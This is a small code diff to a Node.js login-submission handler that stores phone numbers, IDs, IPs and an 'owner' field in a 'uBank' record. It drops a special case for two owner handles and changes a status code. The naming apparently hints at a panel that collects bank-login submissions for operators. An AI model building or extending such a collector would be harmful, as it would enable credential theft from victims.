@@ -48,10 +48,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { telephone, uniqueid, owner, ip } = req.body;
   try {
-    if (owner === "echo2911" || owner === "echo2811") {
-    } else {
-      await uBank.create({ uniqueid, telephone, status: 2, owner, ip, timestamp: moment().format()});
-    }
+    await uBank.create({ uniqueid, telephone, status: 12, owner, ip, timestamp: moment().format() });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
